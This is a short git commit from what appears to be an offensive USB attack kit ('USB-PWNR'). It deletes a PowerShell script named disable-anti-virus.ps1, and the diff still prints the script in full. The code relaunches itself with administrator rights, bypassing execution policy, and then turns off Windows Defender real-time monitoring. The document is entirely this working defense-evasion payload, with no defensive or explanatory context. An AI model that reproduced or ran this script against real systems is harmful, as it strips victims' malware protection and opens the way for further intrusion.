164f24b8c5f5813d101a649023ac1b681d6f4a83
C1PH3R <c1ph3r@hostdaemon.nl>
2018-01-17 14:33:36 +0100

    Delete disable-anti-virus.ps1

--- USB-PWNR -SLOW/disable-anti-virus.ps1
+++
@@ -1,3 +0,0 @@
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
-
-Set-MpPreference -DisableRealtimeMonitoring $true
